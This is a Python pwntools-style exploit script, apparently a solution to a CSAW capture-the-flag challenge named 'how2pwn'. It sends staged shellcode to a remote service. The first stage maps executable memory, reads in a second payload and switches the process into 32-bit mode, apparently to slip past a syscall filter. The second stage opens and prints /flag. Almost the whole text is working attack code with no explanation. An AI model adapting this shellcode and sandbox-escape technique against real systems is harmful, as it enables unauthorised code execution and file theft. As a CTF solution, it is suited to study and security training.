#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./chal3")
host = args.HOST or "how2pwn.chal.csaw.io"
port = int(args.PORT or 60003)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()

switch_to_x32 = b"\xc7\x44\x24\x04\x23\x00\x00\x00\xc7\x04\x24\x00\xd0\xea\x0d\xcb"

mmap = asm(
    """
xor rax, rax
mov al, 9
mov rdi, 0xdead000
mov rsi, 0x1000
mov rdx, 7
mov r10, 0x32
mov r8, 0xffffffff
mov r9, 0
syscall"""
)

read = asm(
    """
mov rax, 0
xor rdi, rdi
mov rsi, 0xdead000
mov rdx, 100
syscall"""
)

# ticket1: 764fce03d863b5155db4af260374acc1
# ticket2: 8e7bd9e37e38a85551d969e29b77e1ce
re()
s(b"8e7bd9e37e38a85551d969e29b77e1ce")
print(rl())
shellcode = b"\x90\x90\x90"
shellcode += mmap
shellcode += read
shellcode += switch_to_x32

shellcode2 = b"\x90\x90"
shellcode2 += b"\xbc\xc0\xd7\xea\x0d"
shellcode2 += b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
shellcode2 += b"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
shellcode2 += b"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
shellcode2 += b"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
shellcode2 += b"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
shellcode2 += b"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
shellcode2 += b"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
shellcode2 += b"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
shellcode2 += b"\xff"
shellcode2 += b"/flag\x00"

sl(shellcode)
# sleep(2)
sl(shellcode2)
print(io.recvall())
io.interactive()
